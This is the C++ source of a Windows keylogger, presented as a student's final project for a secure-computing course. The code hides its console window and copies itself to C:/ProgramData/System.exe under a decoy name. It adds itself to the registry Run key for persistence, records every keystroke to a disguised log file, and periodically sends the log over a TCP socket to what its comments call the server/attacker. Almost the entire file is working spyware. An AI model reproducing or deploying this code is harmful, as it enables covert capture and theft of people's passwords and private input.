//********************************************************************
//
// Stanley Razumov
// Introduction to Secure Computing
// Final Programming Project: Obtaining User Input Using a Keylogger (Client Side)
// December 3, 2019
// Instructor: Dr. Ajay K. Katangur
//
//********************************************************************
#include <fstream>
#include <iostream>
#include <string>
#include <Windows.h>
#include <winuser.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
//Declaring variables in the preprocessor
#define OUTPUT_FILE_NAME "C:\\ProgramData\\zSystemlog.txt"	
#define KEY_DOWN -32767
#define FILE_NAME "MyFunApp.exe"
#define DESTINATION_IP "127.0.0.1"
#define PORT 15000

using namespace std;

void writeToFile(int keystroke);
void sendCollectedData();

//********************************************************************
//
// Main Function
//
// This function hides the console window, finds the path(and name of the executable)
// where this program is located, and if it's called by its original name 
// declared in FILE_NAME ("MyFunApp.exe") copies itself to
// "C:/ProgramData/" as "System.exe", and adds the newly created "System.exe"
// to startup. In case if it will not be called "MyFunApp.exe" the rest of the 
// code is executed.
// 
//
// Return Value
// ------------
// int                                                    0 for success
//
// Local Variables
// ---------------
// console_window                    struct HWND          Retrieves the window handle used by the console 
//                                                        associated with the calling process.
//
// path                              char                 Holds the current path and name for the program
//
// fstr                              string::size_type    Formatted path string
//
// path_and_name                     string               Converts the formatted string::size_type to a 
//                                                        regular string 
//
// found                             long                 Holds some value if FILE_NAME is found or -1
//                                                        for npos (not in position)
//
// timer                             long                 Pseudotimer holding number of keypresses
//
// SEND_COLLECTED_DATA_DELAY         const int            When the timer reaches this threshhold send the data
//
// copied_exec_path                  const unsigned char  Holds the destination directory
//
//*******************************************************************
int main(){
    // Retrieves the window handle used by the console associated with the calling process.
    HWND console_window = GetConsoleWindow();
    // Closes the window immediately after the program launch
    ShowWindow(console_window, 0); 
    char path[MAX_PATH];
    // Get own path/name
    GetModuleFileName(NULL, path, MAX_PATH);
    string::size_type fstr = string(path).find_first_of(" ");
    string path_and_name = string(path).substr(0, fstr);
    size_t found = path_and_name.find(FILE_NAME);
    // If FILE_NAME matches current name
    if (found != string::npos){
        // Copy itself to specified destination
        CopyFile(path_and_name.c_str(), "C:/ProgramData/System.exe", FALSE);
        // Add the newly created copy to startup using registry
        HKEY hKey;
        RegOpenKeyExA(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            KEY_WRITE,
            &hKey
        );
        const unsigned char copied_exec_path[26] = "C:\\ProgramData\\System.exe";
        RegSetValueExA (hKey, "zSystem", 0, REG_SZ, copied_exec_path, sizeof (copied_exec_path));
        RegCloseKey (hKey);
    }

    long timer = 0;
    const int SEND_COLLECTED_DATA_DELAY = 1000;
    char inputCharacter;
    //Keep cycling and looking for pressed keys
    for(;;) {
        Sleep(1); 
        for (inputCharacter = 8; inputCharacter < 256; inputCharacter++) { 
            //If key is pressed  - write it to the log 
            if (GetAsyncKeyState(inputCharacter) == KEY_DOWN) { 
                writeToFile(inputCharacter);
                timer ++;
            }
            // If timer reached its limit - send data
            if (timer >= SEND_COLLECTED_DATA_DELAY){
                sendCollectedData();
                timer = 0;
            }
        }     
    }
    return 0;
}

//********************************************************************
//
// writeToFile Function
//
// Does exactly what the name suggests. Has additional virtual key handling
// because Windows API for some reason maps the Numpad and some
// other keys as lower case letters.
//
// Return Value
// ------------
// void
//
// Local Variables
// ---------------
// out		*FILE	File pointer
// retval	int		Temporary Return Value
//
//*******************************************************************
void writeToFile(int keystroke) {
    
    FILE *out;
    out = fopen(OUTPUT_FILE_NAME, "a+");
    
    if (keystroke == VK_SHIFT)
        fprintf(out, "%s", "[SHIFT]");
    else if (keystroke == VK_CAPITAL)
        fprintf(out, "%s", "[CAPS]");
    else if (keystroke == VK_BACK)
        fprintf(out, "%s", "[BACKSPACE]");
    else if (keystroke == VK_LBUTTON)
        fprintf(out, "%s", "[LCLICK]");
    else if (keystroke == VK_RETURN)
        fprintf(out, "%s", "[ENTER]");
    else if (keystroke == VK_ESCAPE)
        fprintf(out, "%s", "[ESCAPE]");
    else if (keystroke == VK_SPACE)
        fprintf(out, "%s", " ");
    else if (keystroke == VK_NUMPAD0)
        fprintf(out, "%s", "[NUMPAD0]");
    else if (keystroke == VK_NUMPAD1)
        fprintf(out, "%s", "[NUMPAD1]");
    else if (keystroke == VK_NUMPAD2)
        fprintf(out, "%s", "[NUMPAD2]");
    else if (keystroke == VK_NUMPAD3)
        fprintf(out, "%s", "[NUMPAD3]");
    else if (keystroke == VK_NUMPAD4)
        fprintf(out, "%s", "[NUMPAD4]");
    else if (keystroke == VK_NUMPAD5)
        fprintf(out, "%s", "[NUMPAD5]");
    else if (keystroke == VK_NUMPAD6)
        fprintf(out, "%s", "[NUMPAD6]");
    else if (keystroke == VK_NUMPAD7)
        fprintf(out, "%s", "[NUMPAD7]");
    else if (keystroke == VK_NUMPAD8)
        fprintf(out, "%s", "[NUMPAD8]");
    else if (keystroke == VK_NUMPAD9)
        fprintf(out, "%s", "[NUMPAD9]");
    else
        fprintf(out, "%s", &keystroke);

    fclose(out);
    Sleep(10);
}
//********************************************************************
//
// sendCollectedData Function
//
// Sets up and opens a socket to transfer the collected data to the 
// server/attacker.
//
// Return Value
// ------------
// void
//
// Local Variables
// ---------------
// clientsockfd		    int         	Socket descriptor
// fread_return_code	int		        Holds the current byte fread() is reading
// buff                 char            Buffer for data from the log
// servaddr             sockaddr_in     Holds server networking info
// collected_data       *FILE           Pointer to our log file  
//*******************************************************************
void sendCollectedData(){
    int clientsockfd, fread_return_code;
    struct sockaddr_in servaddr;
    char buff[1024];
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(DESTINATION_IP);
    servaddr.sin_port = htons(PORT);
    clientsockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(clientsockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
    bzero(buff, sizeof(buff));

    FILE *collected_data;
    //Read and send byte by byte
    collected_data = fopen(OUTPUT_FILE_NAME, "rb");
    while(fread_return_code = fread(buff, 1, sizeof(buff), collected_data) > 0){
        send(clientsockfd, buff, sizeof(buff), 0);
    }
    fclose(collected_data);
    close(clientsockfd);
    // Clearing the log after sending
    fclose(fopen(OUTPUT_FILE_NAME, "w"));

}